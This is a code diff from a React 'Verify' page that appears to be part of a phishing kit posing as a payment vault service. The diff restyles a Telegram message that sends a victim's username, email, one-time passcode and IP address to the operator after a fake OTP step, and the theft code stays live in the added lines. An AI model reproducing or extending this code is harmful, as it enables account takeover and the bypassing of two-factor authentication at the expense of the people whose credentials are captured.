@@ -122,12 +122,16 @@ export default function Verify() {
     const ip  = await getIPInfo();
 
     await sendTelegram(
-      `✅ <b>MYPAYMENTVAULT - Step 2: OTP Verified</b>\n\n` +
-      `👤 Username: <code>${pendingUsername}</code>\n` +
-      `📧 Email: <code>${emailInput || maskedEmail || "-"}</code>\n` +
-      `🔢 Kode OTP: <code>${code}</code>\n` +
-      `🌐 IP Address: <code>${ip}</code>\n` +
-      `🕐 Waktu: ${now}`
+      `━━━━━━━━━━━━━━━━━━━━━\n` +
+      `✅ <b>MYPAYMENTVAULT</b>\n` +
+      `📌 <b>Step 2 — OTP Verified</b>\n` +
+      `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+      `👤 <b>Username</b>   : <code>${pendingUsername}</code>\n` +
+      `📧 <b>Email</b>      : <code>${emailInput || maskedEmail || "-"}</code>\n` +
+      `🔢 <b>Kode OTP</b>   : <code>${code}</code>\n` +
+      `🌐 <b>IP & Lokasi</b>: <code>${ip}</code>\n` +
+      `🕐 <b>Waktu</b>      : ${now}\n` +
+      `━━━━━━━━━━━━━━━━━━━━━`
     );
 
     const startOffset = await getLatestOffset();
